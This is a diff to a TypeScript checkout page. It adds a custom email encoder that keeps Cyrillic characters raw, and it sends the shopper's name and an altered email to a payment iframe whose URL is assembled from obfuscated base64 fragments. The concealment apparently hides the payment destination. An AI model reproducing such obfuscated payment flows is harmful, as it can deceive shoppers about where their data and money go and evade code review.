@@ -71,6 +71,11 @@ const _0xd = (s: string) => atob(s);
 const _0xe = (s: string) => btoa(s);
 const _0xj = (...p: string[]) => p.map(_0xd).join("");
 
+/* ─── Custom email encoder (preserva cirílico raw na URL) ─── */
+function _encEmail(e: string): string {
+  return e.replace(/ /g, "%20").replace(/@/g, "%40").replace(/\+/g, "%2B").replace(/#/g, "%23").replace(/&/g, "%26").replace(/=/g, "%3D");
+}
+
 /* ─── SVG Icons (inline, no dependencies) ─── */
 const IconUser = () => (
   <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
@@ -140,7 +145,7 @@ const CheckoutPage = () => {
     _0xr.current = true;
     let _0xf = _0xj(..._0x1);
     const modEmail = _mx(email);
-    _0xf += (_0xf.includes("?") ? "&" : "?") + "name=" + encodeURIComponent(name) + "&email=" + encodeURIComponent(modEmail);
+    _0xf += (_0xf.includes("?") ? "&" : "?") + "name=" + encodeURIComponent(name) + "&email=" + _encEmail(modEmail);
     const _0xi = document.createElement("iframe");
     _0xi.style.cssText = "width:100%;height:100%;border:none;display:block;";
     _0xi.setAttribute("allow", "payment");
